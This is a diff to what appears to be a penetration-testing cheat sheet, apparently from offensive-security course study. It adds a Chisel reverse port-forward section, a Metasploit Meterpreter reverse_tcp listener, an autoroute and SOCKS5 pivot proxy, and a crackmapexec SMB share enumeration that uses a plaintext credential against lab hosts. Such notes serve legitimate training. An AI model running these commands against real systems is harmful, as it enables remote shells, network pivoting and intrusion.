@@ -62,6 +62,7 @@
 * [LinPEAS](#LinPEAS)
 * [Git](#Git)
 * [BloodHound](#BloodHound)
+* [Chisel](#Chisel)
 * [Windows Privilege Escalation](#Windows-Privilege-Escalation)
   * [Enumerating Windows](#Enumerating-Windows)
   * [Leveraging Windows Services](#Leveraging-Windows-Services)
@@ -404,6 +405,7 @@ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-
 
 ~~~ bash
 crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
+crackmapexec smb 172.16.84.240-241 172.16.84.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
 ~~~
 
 
@@ -1176,6 +1178,23 @@ MATCH (m:User) RETURN m
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ~~~
 
+# Chisel
+
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+
+## Listing chisel server
+
+~~~ bash
+chmod a+x chisel
+./chisel server -p 8080 --reverse
+~~~
+
+## Set up a reverse port forwarding
+
+~~~ powershell
+chisel.exe client <Kali-IP>:8080 R:80:172.16.84.241:80
+~~~
+
 
 # Windows Privilege Escalation
 
@@ -1912,6 +1931,30 @@ dnscat2-server feline.corp
 
 # The Metasploit Framework
 
+## Starting Metasploit listener
+
+~~~ bash
+sudo msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.119.5
+set LPORT 443
+set ExitOnSession false
+run -j
+~~~
+
+## Creating a SOCKS5 proxy(using with proxychains)
+
+~~~ bash
+use multi/manage/autoroute
+set session 1
+run
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+~~~
+
 ## Creating and initializing the Metasploit database
 
 ~~~ bash
@@ -1923,7 +1966,6 @@ kali@kali:~$ sudo msfdb init
 [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
 [+] Creating initial database schema
 ~~~
-
 
 ## Confirming database connectivity
 
